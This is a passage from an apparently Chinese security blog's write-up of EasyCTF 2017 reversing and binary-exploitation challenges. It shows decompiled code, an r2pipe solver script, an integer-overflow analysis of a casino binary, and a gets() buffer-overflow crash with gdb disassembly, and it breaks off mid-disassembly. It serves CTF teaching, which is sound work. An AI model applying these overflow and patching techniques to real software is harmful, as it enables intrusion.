");</p><p>&nbsp; &nbsp; std::istream::operator&gt;&gt;(&amp;std::cin, &amp;v9);</p><p>&nbsp; &nbsp; if ( v9 == v12 )</p><p>&nbsp; &nbsp; &nbsp; break;</p><p>&nbsp; &nbsp; if ( v9 &gt;= v12 )</p><p>&nbsp; &nbsp; &nbsp; v5 = "hi";</p><p>&nbsp; &nbsp; else</p><p>&nbsp; &nbsp; &nbsp; v5 = "lo";</p><p>&nbsp; &nbsp; LODWORD(v6) = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;((__int64)&amp;std::cout, (__int64)v5);</p><p>&nbsp; &nbsp; std::ostream::operator&lt;&lt;(v6, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);</p><p>&nbsp; }</p><p>&nbsp; for ( i = 0; (unsigned __int64)i &lt; 0x22; ++i )</p><p>&nbsp; &nbsp; std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, (unsigned int)(char)(v13[i] ^ c610[4 * i]));</p><p>&nbsp; return 1;</p><p>}</p></code></pre>
</p>
<p style="text-align: center;"><img data-original="http://image.3001.net/images/20170329/1490776234886.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></p>
<noscript><img src="http://image.3001.net/images/20170329/1490776234886.png!small" alt=""></p></noscript>
</p>
<p>让 <b>if ( v9 == v12 ) break;</b> 执行成功跳出 <b>while</b> 循环进入 <b>for</b> 循环得到flag最简单的方式就是修改 <b>jnz</b> 指令为 <b>nop</b> 指令                    </p>
</p>
<p style="text-align: center;"><img data-original="http://image.3001.net/images/20170329/14907762429569.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></p>
<noscript><img src="http://image.3001.net/images/20170329/14907762429569.png!small" alt=""></p></noscript>
</p>
<h3>Hex QR</h3>
</p>
<p><b>problem</b></p>
</p>
<p>I&#8217;ve stumbled upon a very <a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/qrt/flag.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank">strange QR code</a>&#8230; seems like it was generated with this generator. What could it mean?</p>
</p>
<p><b>solution</b></p>
</p>
<p><a href="https://github.com/EasyCTF/easyctf-2017-writeups/blob/master/reverse-engineering/hexqr-200-points.md" target="_blank">writeup</a></p>
</p>
<h3>67k</h3>
</p>
<p><b>problem</b></p>
</p>
<p><a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/r3ndom-67k/$%7Bbins_zip%7D" target="_blank">Here</a> are 67k binaries, well more accurately 67,139 binaries. Solve every single one, append the results together in order (shouldn&#8217;t            be too difficult as the binaries are numbered) and then from there I&#8217;m sure you can figure it out.</p>
</p>
<p>Hint: Maybe write a script.</p>
</p>
<p><b>solution</b></p>
</p>
<p><a href="https://github.com/VulnHub/ctf-writeups/blob/master/2017/easyctf/67k.md" target="_blank">writeup</a></p>
</p>
<pre><code><p>#!/usr/bin/env python</p><p>import r2pipe</p><p>import json</p><p>import sys</p><p>import time</p><p>import os</p><p># shift arithmetic right copied from http://stackoverflow.com/a/5833119</p><p>def rshift(val, n):&nbsp;</p><p>&nbsp; &nbsp; return val&gt;&gt;n if val &gt;= 0 else (val+0x100000000)&gt;&gt;n</p><p>if __name__ == "__main__":</p><p>&nbsp; &nbsp; r2p = r2pipe.open(sys.argv[1])</p><p>&nbsp; &nbsp; r2p.cmd("aaa")</p><p>&nbsp; &nbsp; # get the name of the function that does the operation</p><p>&nbsp; &nbsp; t = r2p.cmd("aflj")</p><p>&nbsp; &nbsp; d = json.loads(t)</p><p>&nbsp; &nbsp; fc_name = d[0]["name"]</p><p>&nbsp; &nbsp; if fc_name == "entry0":</p><p>&nbsp; &nbsp; &nbsp; &nbsp; fc_name = d[1]["name"]</p><p>&nbsp; &nbsp; # determine if sub, add, or xor is used</p><p>&nbsp; &nbsp; t = r2p.cmd("pdj 1@%s" %( fc_name))</p><p>&nbsp; &nbsp; d = json.loads(t)</p><p>&nbsp; &nbsp; ins = d[0]["opcode"]</p><p>&nbsp; &nbsp; # get the value of EAX</p><p>&nbsp; &nbsp; t = r2p.cmd("pdj 1@entry0+0x1f")</p><p>&nbsp; &nbsp; d = json.loads(t)</p><p>&nbsp; &nbsp; pointer = d[0]["esil"].split(",")[0]</p><p>&nbsp; &nbsp; pointer = int(pointer, 16)</p><p>&nbsp; &nbsp; t = r2p.cmd("pxrj 4@%d" % (pointer,))</p><p>&nbsp; &nbsp; d = json.loads(t)</p><p>&nbsp; &nbsp; eax = d[0]["value"]</p><p>&nbsp; &nbsp; # get the value of ECX</p><p>&nbsp; &nbsp; t = r2p.cmd("pdj 1@entry0+0x24")</p><p>&nbsp; &nbsp; d = json.loads(t)</p><p>&nbsp; &nbsp; ecx = d[0]["opcode"].split()[-1]</p><p>&nbsp; &nbsp; ecx = int(ecx, 16)</p><p>&nbsp; &nbsp; # determine the operation used by do_foo()</p><p>&nbsp; &nbsp; answer = 0</p><p>&nbsp; &nbsp; if "sub" in ins:</p><p>&nbsp; &nbsp; &nbsp; &nbsp; answer = eax - ecx</p><p>&nbsp; &nbsp; elif "xor" in ins:</p><p>&nbsp; &nbsp; &nbsp; &nbsp; answer = eax ^ ecx</p><p>&nbsp; &nbsp; elif "add" in ins:</p><p>&nbsp; &nbsp; &nbsp; &nbsp; answer = eax + ecx</p><p>&nbsp; &nbsp; # get value to use for SAR operation</p><p>&nbsp; &nbsp; t = r2p.cmd("pdj 1@entry0+0x36")</p><p>&nbsp; &nbsp; d = json.loads(t)</p><p>&nbsp; &nbsp; pointer = d[0]["esil"].split(",")[0]</p><p>&nbsp; &nbsp; pointer = int(pointer, 16)</p><p>&nbsp; &nbsp; t = r2p.cmd("pxrj 4@%d" % (pointer,))</p><p>&nbsp; &nbsp; t = t.replace("\\x", "")</p><p>&nbsp; &nbsp; d = json.loads(t)</p><p>&nbsp; &nbsp; val = d[0]["value"]</p><p>&nbsp; &nbsp; cl = val &amp; 0xFF</p><p>&nbsp; &nbsp; # get the solution to the challenge</p><p>&nbsp; &nbsp; solve = rshift(answer, cl)</p><p>&nbsp; &nbsp; solve = solve &amp; 0xff</p><p>&nbsp; &nbsp; sys.stdout.write("%c" % (solve,))</p></code></pre>
</p>
</p>
<h3>Heaps of Knowledge</h3>
</p>
<p><b>problem</b></p>
</p>
<p>Can you pwn this? Navigate to <b>/problems/heaps_of_knowledge/</b> on the shell server and read <b>flag.txt</b>.</p>
</p>
<p><a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/heaps_of_knowledge/heaps_of_knowledge" target="_blank">Binary</a></p>
</p>
<p><b>solution</b></p>
</p>
<p><a href="https://github.com/VulnHub/ctf-writeups/blob/master/2017/easyctf/heaps-of-knowledge.md" target="_blank">writeup</a></p>
</p>
<h3>Morphin</h3>
</p>
<p>Welcome to the RE training course, this problem has 4 phases. Solve all four to get the flag.</p>
</p>
<p>Note: On phase 1 round to 6 significant figures.</p>
</p>
<p>Download</p>
</p>
<p><a href="https://writeups.easyctf.com/reverse-engineering.html" target="_blank">writeup</a></p>
</p>
<h2>0&#215;07 Binary Exploitation</h2>
</p>
<h3><b>Risky Business</b></h3>
</p>
<p><b>problem</b></p>
</p>
<p>We wanted to branch into the casino business, but human employees are too expensive so we decided to automate it. I feel like we missed something obvious though&#8230; Oh well! Here&#8217;s the binary: <a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/risky-business/casino" target="_blank">casino</a></p>
</p>
<p>Solve this problem by logging into the shell server and navigating to <b>/problems/casino</b>.</p>
</p>
<pre><code><p>int __cdecl main(int argc, const char **argv, const char **envp)</p><p>{</p><p>&nbsp; __int64 v3; // rax@1</p><p>&nbsp; __int64 v4; // rdx@1</p><p>&nbsp; __int64 v5; // rax@1</p><p>&nbsp; int v6; // ebx@2</p><p>&nbsp; __int64 v7; // rdx@2</p><p>&nbsp; __int64 v8; // rax@2</p><p>&nbsp; __int64 v9; // rax@2</p><p>&nbsp; __int64 v10; // rdi@2</p><p>&nbsp; __int64 v11; // rdx@2</p><p>&nbsp; __int64 v13; // rax@4</p><p>&nbsp; int v14; // eax@4</p><p>&nbsp; __int64 v15; // rdx@4</p><p>&nbsp; bool v16; // al@6</p><p>&nbsp; __int64 v17; // rax@11</p><p>&nbsp; __int64 v18; // rax@13</p><p>&nbsp; __int64 v19; // rdx@14</p><p>&nbsp; __int64 v20; // rax@15</p><p>&nbsp; __int64 v21; // rax@16</p><p>&nbsp; int v22; // [sp+Ch] [bp-1C4h]@4</p><p>&nbsp; char v23; // [sp+10h] [bp-1C0h]@4</p><p>&nbsp; char v24; // [sp+30h] [bp-1A0h]@4</p><p>&nbsp; __int64 v25; // [sp+B0h] [bp-120h]@4</p><p>&nbsp; __int64 v26; // [sp+1B8h] [bp-18h]@1</p><p>&nbsp; v26 = *MK_FP(__FS__, 40LL);</p><p>&nbsp; LODWORD(v3) = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, "Welcome to the EasyCTF 2017 Casino", envp);</p><p>&nbsp; std::ostream::operator&lt;&lt;(v3, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);</p><p>&nbsp; LODWORD(v5) = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &amp;std::cout,</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "Try your luck and gain access to our exclusive club!",</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; v4);</p><p>&nbsp; std::ostream::operator&lt;&lt;(v5, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);</p><p>&nbsp; while ( 1 )</p><p>&nbsp; {</p><p>&nbsp; &nbsp; std::ostream::operator&lt;&lt;(&amp;std::cout, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);</p><p>&nbsp; &nbsp; v6 = networth;</p><p>&nbsp; &nbsp; LODWORD(v8) = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, "Your net worth is: $", v7);</p><p>&nbsp; &nbsp; LODWORD(v9) = std::ostream::operator&lt;&lt;(v8, (unsigned int)v6);</p><p>&nbsp; &nbsp; v10 = v9;</p><p>&nbsp; &nbsp; std::ostream::operator&lt;&lt;(v9, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);</p><p>&nbsp; &nbsp; if ( networth &gt; 2000000000 )</p><p>&nbsp; &nbsp; &nbsp; break;</p><p>&nbsp; &nbsp; LODWORD(v13) = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&amp;std::cout,</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;"Please enter how much you would like to bet:",</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;v11);</p><p>&nbsp; &nbsp; std::ostream::operator&lt;&lt;(v13, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);</p><p>&nbsp; &nbsp; std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::basic_string(&amp;v23);</p><p>&nbsp; &nbsp; std::getline&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;_TMC_END__, &amp;v23);</p><p>&nbsp; &nbsp; v14 = std::operator|(16LL, 8LL);</p><p>&nbsp; &nbsp; std::__cxx11::basic_stringstream&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::basic_stringstream(</p><p>&nbsp; &nbsp; &nbsp; &amp;v24,</p><p>&nbsp; &nbsp; &nbsp; &amp;v23,</p><p>&nbsp; &nbsp; &nbsp; (unsigned int)v14);</p><p>&nbsp; &nbsp; std::istream::operator&gt;&gt;(&amp;v24, &amp;v22);</p><p>&nbsp; &nbsp; v16 = (unsigned __int8)std::basic_ios&lt;char,std::char_traits&lt;char&gt;&gt;::eof(&amp;v25) ^ 1</p><p>&nbsp; &nbsp; &nbsp; &nbsp;|| (unsigned __int8)std::basic_ios&lt;char,std::char_traits&lt;char&gt;&gt;::fail(&amp;v25);</p><p>&nbsp; &nbsp; if ( v16 )</p><p>&nbsp; &nbsp; {</p><p>&nbsp; &nbsp; &nbsp; std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, "That was not a valid number <img src='http://image.3001.net/images/index/smilies/icon_sad.gif' alt=':(' class='wp-smiley' /> ", v15);</p><p>&nbsp; &nbsp; }</p><p>&nbsp; &nbsp; else if ( v22 &gt; 0 )</p><p>&nbsp; &nbsp; {</p><p>&nbsp; &nbsp; &nbsp; if ( v22 &lt;= 100000000 )</p><p>&nbsp; &nbsp; &nbsp; {</p><p>&nbsp; &nbsp; &nbsp; &nbsp; if ( (unsigned __int8)gamble() ^ 1 )</p><p>&nbsp; &nbsp; &nbsp; &nbsp; {</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; LODWORD(v20) = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, "Sorry, I'm afraid you've lost <img data-original="http://image.3001.net/images/index/smilies/icon_sad.gif" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=':(' class='wp-smiley' /> ", v19);</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; std::ostream::operator&lt;&lt;(v20, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; networth -= v22;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; }</p><p>&nbsp; &nbsp; &nbsp; &nbsp; else</p><p>&nbsp; &nbsp; &nbsp; &nbsp; {</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; LODWORD(v21) = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, "Congratulations, you won!", v19);</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; std::ostream::operator&lt;&lt;(v21, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; networth += v22;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; }</p><p>&nbsp; &nbsp; &nbsp; }</p><p>&nbsp; &nbsp; &nbsp; else</p><p>&nbsp; &nbsp; &nbsp; {</p><p>&nbsp; &nbsp; &nbsp; &nbsp; LODWORD(v18) = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&amp;std::cout,</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;"Sorry, the most we can allow you to bet is $100,000,000",</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;v15);</p><p>&nbsp; &nbsp; &nbsp; &nbsp; std::ostream::operator&lt;&lt;(v18, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);</p><p>&nbsp; &nbsp; &nbsp; }</p><p>&nbsp; &nbsp; }</p><p>&nbsp; &nbsp; else</p><p>&nbsp; &nbsp; {</p><p>&nbsp; &nbsp; &nbsp; LODWORD(v17) = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, "You must bet a positive amount", v15);</p><p>&nbsp; &nbsp; &nbsp; std::ostream::operator&lt;&lt;(v17, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);</p><p>&nbsp; &nbsp; }</p><p>&nbsp; &nbsp; std::__cxx11::basic_stringstream&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::~basic_stringstream((__int64)&amp;v24);</p><p>&nbsp; &nbsp; std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::~basic_string(&amp;v23);</p><p>&nbsp; }</p><p>&nbsp; printflag(v10, (__int64)&amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;, v11);</p><p>&nbsp; return 0;</p><p>}</p></code></pre>
<noscript><img src='http://image.3001.net/images/index/smilies/icon_sad.gif' alt=':(' class='wp-smiley' /> ", v15);</p><p>&nbsp; &nbsp; }</p><p>&nbsp; &nbsp; else if ( v22 &gt; 0 )</p><p>&nbsp; &nbsp; {</p><p>&nbsp; &nbsp; &nbsp; if ( v22 &lt;= 100000000 )</p><p>&nbsp; &nbsp; &nbsp; {</p><p>&nbsp; &nbsp; &nbsp; &nbsp; if ( (unsigned __int8)gamble() ^ 1 )</p><p>&nbsp; &nbsp; &nbsp; &nbsp; {</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; LODWORD(v20) = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, "Sorry, I'm afraid you've lost <img src='http://image.3001.net/images/index/smilies/icon_sad.gif' alt=':(' class='wp-smiley' /> ", v19);</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; std::ostream::operator&lt;&lt;(v20, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; networth -= v22;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; }</p><p>&nbsp; &nbsp; &nbsp; &nbsp; else</p><p>&nbsp; &nbsp; &nbsp; &nbsp; {</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; LODWORD(v21) = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, "Congratulations, you won!", v19);</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; std::ostream::operator&lt;&lt;(v21, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; networth += v22;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; }</p><p>&nbsp; &nbsp; &nbsp; }</p><p>&nbsp; &nbsp; &nbsp; else</p><p>&nbsp; &nbsp; &nbsp; {</p><p>&nbsp; &nbsp; &nbsp; &nbsp; LODWORD(v18) = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&amp;std::cout,</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;"Sorry, the most we can allow you to bet is $100,000,000",</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;v15);</p><p>&nbsp; &nbsp; &nbsp; &nbsp; std::ostream::operator&lt;&lt;(v18, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);</p><p>&nbsp; &nbsp; &nbsp; }</p><p>&nbsp; &nbsp; }</p><p>&nbsp; &nbsp; else</p><p>&nbsp; &nbsp; {</p><p>&nbsp; &nbsp; &nbsp; LODWORD(v17) = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, "You must bet a positive amount", v15);</p><p>&nbsp; &nbsp; &nbsp; std::ostream::operator&lt;&lt;(v17, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);</p><p>&nbsp; &nbsp; }</p><p>&nbsp; &nbsp; std::__cxx11::basic_stringstream&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::~basic_stringstream((__int64)&amp;v24);</p><p>&nbsp; &nbsp; std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::~basic_string(&amp;v23);</p><p>&nbsp; }</p><p>&nbsp; printflag(v10, (__int64)&amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;, v11);</p><p>&nbsp; return 0;</p><p>}</p></code></pre></noscript>
</p>
<p style="text-align: center;"><img data-original="http://image.3001.net/images/20170329/14907762618810.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></p>
<noscript><img src="http://image.3001.net/images/20170329/14907762618810.png!small" alt=""></p></noscript>
</p>
<p>整型溢出问题大致先看了一下逻辑只要满足networth &gt; 2000000000就可以跳出while循环获取到flagnetwork是int类型的而在</p>
</p>
<pre><code><p>&nbsp; &nbsp; &nbsp; &nbsp; if ( (unsigned __int8)gamble() ^ 1 )</p><p>&nbsp; &nbsp; &nbsp; &nbsp; {</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; LODWORD(v20) = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, "Sorry, I'm afraid you've lost <img data-original="http://image.3001.net/images/index/smilies/icon_sad.gif" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=':(' class='wp-smiley' /> ", v19);</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; std::ostream::operator&lt;&lt;(v20, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; networth -= v22;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; }</p></code></pre>
<noscript><img src='http://image.3001.net/images/index/smilies/icon_sad.gif' alt=':(' class='wp-smiley' /> ", v19);</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; std::ostream::operator&lt;&lt;(v20, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; networth -= v22;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; }</p></code></pre></noscript>
</p>
<p style="text-align: center;"><img data-original="http://image.3001.net/images/20170329/14907762738808.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></p>
<noscript><img src="http://image.3001.net/images/20170329/14907762738808.png!small" alt=""></p></noscript>
</p>
<p>中并没有先判断network值是否小于0就直接相减这样导致余额为负也还可以继续赌(和)博谐</p>
</p>
<p style="text-align: center;"><img data-original="http://image.3001.net/images/20170329/14907762816820.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></p>
<noscript><img src="http://image.3001.net/images/20170329/14907762816820.png!small" alt=""></p></noscript>
</p>
<p>32位下int: 4 byte = 32 bit 有符号signed范围2^31-1 ~ -2^31 即2147483647 ~ -2147483648当我们的余额小于还小于-2147483648时就会溢出而溢出处理是环形的画个简图</p>
</p>
<p style="text-align: center;"><img data-original="http://image.3001.net/images/20170329/14907762906449.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></p>
<noscript><img src="http://image.3001.net/images/20170329/14907762906449.png!small" alt=""></p></noscript>
</p>
<p style="text-align: center;"><img data-original="http://image.3001.net/images/20170329/14907763033848.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></p>
<noscript><img src="http://image.3001.net/images/20170329/14907763033848.png!small" alt=""></p></noscript>
</p>
<h3>Doubly Dangerous</h3>
</p>
<p><b>problem</b></p>
</p>
<p>There seems to be an issue with <a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/doubly-dangerous/doubly_dangerous" target="_blank">this binary</a>. Can you exploit it? View the problem in the shell server <b>/problems/doubly_dangerous</b>                    directory.</p>
</p>
<p><b>solution</b></p>
</p>
<pre><code><p>int __cdecl main(int argc, const char **argv, const char **envp)</p><p>{</p><p>&nbsp; char s; // [sp+Ch] [bp-4Ch]@1</p><p>&nbsp; float v5; // [sp+4Ch] [bp-Ch]@1</p><p>&nbsp; v5 = 0.0;</p><p>&nbsp; puts("Give me a string: ");</p><p>&nbsp; gets(&amp;s);</p><p>&nbsp; if ( 11.28125 == v5 )</p><p>&nbsp; {</p><p>&nbsp; &nbsp; puts("Success! Here is your flag:");</p><p>&nbsp; &nbsp; give_flag();</p><p>&nbsp; }</p><p>&nbsp; else</p><p>&nbsp; {</p><p>&nbsp; &nbsp; puts("nope!");</p><p>&nbsp; }</p><p>&nbsp; return 0;</p><p>}</p></code></pre>
</p>
</p>
<p>我们要做的就是让 <b>if ( 11.28125 == v5 )</b> 成立又使用了 <b>gets()</b> ,估计与溢出有关。运行一下</p>
</p>
<pre><code><p>sunnyelf@ubuntu:~/Desktop$ ./doubly_dangerous&nbsp;</p><p>Give me a string:&nbsp;</p><p>flag</p><p>nope!</p><p>sunnyelf@ubuntu:~/Desktop$ ./doubly_dangerous</p><p>Give me a string:&nbsp;</p><p>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</p><p>nope!</p><p>Segmentation fault (core dumped)</p></code></pre>
</p>
</p>
<p>果然是溢出于是gdb看一下</p>
</p>
<pre><code><p>(gdb) set disassembly-flavor intel</p><p>(gdb) disas main</p><p>Dump of assembler code for function main:</p><p>&nbsp; &nbsp;0x08048607 &lt;+0&gt;: &nbsp; &nbsp;lea &nbsp; &nbsp;ecx,[esp+0x4]</p><p>&nbsp; &nbsp;0x0804860b &lt;+4&gt;: &nbsp; &nbsp;and &nbsp; &nbsp;esp,0xfffffff0</p><p>&nbsp; &nbsp;0x0804860e &lt;+7&gt;: &nbsp; &nbsp;push &nbsp; DWORD PTR [ecx-0x4]</p><p>&nbsp; &nbsp;0x08048611 &lt;+10&gt;: &nbsp; &nbsp;push &nbsp; ebp</p><p>&nbsp; &nbsp;0x08048612 &lt;+11&gt;: &nbsp; &nbsp;mov &nbsp; &nbsp;ebp,esp</p><p>&nbsp; &nbsp;0x08048614 &lt;+13&gt;: &nbsp; &nbsp;push &nbsp; ecx</p><p>&nbsp; &nbsp;0x08048615 &lt;+14&gt;: &nbsp; &nbsp;sub &nbsp; &nbsp;esp,0x54</p><p>&nbsp; &nbsp;0x08048618 &lt;+17&gt;: &nbsp; &nbsp;fldz &nbsp;&nbsp;</p><p>&nbsp; &nbsp;0x0804861a &lt;+19&gt;: &nbsp; &nbsp;fstp &nbsp; DWORD PTR [ebp-0xc]</p><p>&nbsp; &nbsp;0x0804861d &lt;+22&gt;: &nbsp; &nbsp;sub &nbsp; &nbsp;esp,0xc</p><p>&nbsp; &nbsp;0x08048620 &lt;+25&gt;: &nbsp; &nbsp;push &nbsp; 0x8048735</p><p>&nbsp; &nbsp;0x08048625 &lt;+30&gt;: &nbsp; &nbsp;call &nbsp; 0x8048410 &lt;puts@plt&gt;</p><p>&nbsp; &nbsp;0x0804862a &lt;+35&gt;: &nbsp; &nbsp;add &nbsp; &nbsp;esp,0x10</p><p>&nbsp; &nbsp;0x0804862d &lt;+38&gt;: &nbsp; &nbsp;sub &nbsp; &nbsp;esp,0xc</p><p>&nbsp; &nbsp;0x08048630 &lt;+41&gt;: &nbsp; &nbsp;lea &nbsp; &nbsp;eax,[ebp-0x4c]</p><p>&nbsp; &nbsp;0x08048633 &lt;+44&gt;: &nbsp; &nbsp;push &nbsp; eax</p><p>&nbsp; &nbsp;0x08048634 &lt;+45&gt;: &nbsp; &nbsp;call &nbsp; 0x80483e0 &lt;gets@plt&gt;</p><p>&nbsp; &nbsp;0x08048639 &lt;+50&gt;: &nbsp; &nbsp;add &nbsp; &nbsp;esp,0x10</p><p>&nbsp; &nbsp;0x0804863c &lt;+53&gt;: &nbsp; &nbsp;fld &nbsp; &nbsp;DWORD PTR [ebp-0xc]</p><p>&nbsp; &nbsp;0x0804863f &lt;+56&gt;: &nbsp; &nbsp;fld &nbsp; &nbsp;DWORD PTR ds:0x804876c</p><p>&nbsp; &nbsp;0x08048645 &lt;+62&gt;: &nbsp; &nbsp;fucomip st,st(1)</p><p>&nbsp; &nbsp;0x08048647 &lt;+64&gt;: &nbsp; &nbsp;jp &nbsp; &nbsp; 0x804866c &lt;main+101&gt;</p><p>---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit---c</p><p>&nbsp; &nbsp;0x08048649 &lt;+66&gt;: &nbsp; &nbsp;fld &nbsp; &nbsp;DWORD PTR ds:0x804876c</p><p>&nbsp; &nbsp;0x0804864f &lt;+72&gt;: &nbsp; &nbsp;fucomip st,st(1)</p><p>&nbsp; &nbsp;0x08048651 &lt;+74&gt;: &nbsp; &nbsp;fstp &nbsp; st(0)</p><p>&nbsp; &nbsp;0x08048653 &lt;+76&gt;: &nbsp; &nbsp;jne &nbsp; &nbsp;0x804866e &lt;main+103&gt;</p><p>&nbsp; &nbsp;0x08048655 &lt;+78&gt;: &nbsp; &nbsp;sub &nbsp; &nbsp;esp,0xc</p><p>&nbsp; &nbsp;0x08048658 &lt;+81&gt;: &nbsp; &nbsp;push &nbsp; 0x8048748</p><p>&nbsp; &nbsp;0x0804865d &lt;+86&gt;: &nbsp; &nbsp;call &nbsp; 0x8048410 &lt;puts@plt&gt;</p><p>&nbsp; &nbsp;0x08048662 &lt;+91&gt;: &nbsp; &nbsp;add &nbsp; &nbsp;esp,0x10</p><p>&nbsp; &nbsp;0x08048665 